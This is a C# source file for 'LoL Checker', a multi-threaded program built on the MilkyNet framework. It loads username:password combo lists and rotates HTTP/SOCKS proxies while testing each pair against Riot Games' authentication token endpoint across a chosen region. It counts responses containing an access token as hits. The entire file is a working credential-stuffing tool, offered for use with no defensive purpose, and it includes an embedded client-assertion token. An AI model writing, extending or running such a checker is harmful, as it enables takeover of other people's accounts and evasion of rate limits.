using MilkyNet;
using System;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace LoL_Checker
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            MilkyManager Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("LoL Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            int threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });

            string region = Milky.UserUtils.AskChoice("Region", new string[] { "BR1", "EUN1", "EUW1", "JP1", "KR", "LA1", "LA2", "NA1", "OC1", "PBE1", "RU", "TR1" });

            Milky.ConsoleSettings.runningTitleFormat =
                $"%program.name% %program.version% by %program.author% – Running | " +
                $"Region : {region} | " +
                $"Ran : %run.ran% (%run.ran.percentage%) – Remaining : %run.remaining% – Hits : %run.hits% (%run.hits.percentage%) | " +
                $"RPM : %statistics.rpm% – Elapsed : %statistics.elapsed% – Estimated : %statistics.estimated%";
            Milky.ConsoleSettings.finishedTitleFormat =
                $"%program.name% %program.version% by %program.author% – Finished | " +
                $"Region : {region} | " +
                $"Ran : %run.ran% – Hits : %run.hits% (%run.hits.percentage%) | " +
                $"Elapsed : %statistics.elapsed%";

            Milky.FileUtils.LoadCombos("Username:Password");
            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);

            Milky.RunManager.StartRun();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                string[] splittedCombo = combo.Split(':');

                ResultType resultType = ResultType.Invalid;

                if (splittedCombo.Length == 2)
                {
                    string login = splittedCombo[0];
                    string password = splittedCombo[1];

                    while (resultType == ResultType.Invalid)
                    {
                        MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());

                        try
                        {
                            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                            string response = Milky.RequestUtils.Execute(request,
                                HttpMethod.POST, "https://auth.riotgames.com/token",
                                $"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username={region}|{Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}&scope=openid").ToString();

                            if (response.Contains("access_token"))
                                resultType = ResultType.Hit;
                            else if (response.Contains("invalid_credentials"))
                                break;
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
